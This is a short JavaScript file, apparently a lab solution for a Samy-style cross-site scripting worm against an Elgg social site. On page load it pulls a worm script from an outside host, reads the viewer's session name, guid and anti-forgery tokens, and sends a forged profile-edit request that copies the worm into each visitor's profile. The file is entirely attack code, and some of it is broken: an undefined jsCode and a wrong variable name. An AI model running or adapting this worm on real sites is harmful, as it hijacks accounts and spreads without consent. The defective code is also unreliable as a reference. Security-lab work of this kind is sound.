window.onload = function(){
	alert("I'm hacked!");
        var headerTag = "<script id=\"worm\" src=\"http://www.example60.com/xss_worm.js\" type=\"text/javascript\">";
        //var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + tailTag);
        alert(jsCode);
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var desc = "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2"

        //Construct the content of your url.
        var content= token + ts + name + desc + guid; //FILL IN
        var samyGuid=59; //FILL IN
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
        if(elgg.session.user.guid!=samyGuid)
        {
                //Create and send Ajax request to modify profile
                var Ajax=null;
                Ajax=new XMLHttpRequest();
                Ajax.open("POST", sendurl, true);
                Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
                Ajax.send(content);
        }
}
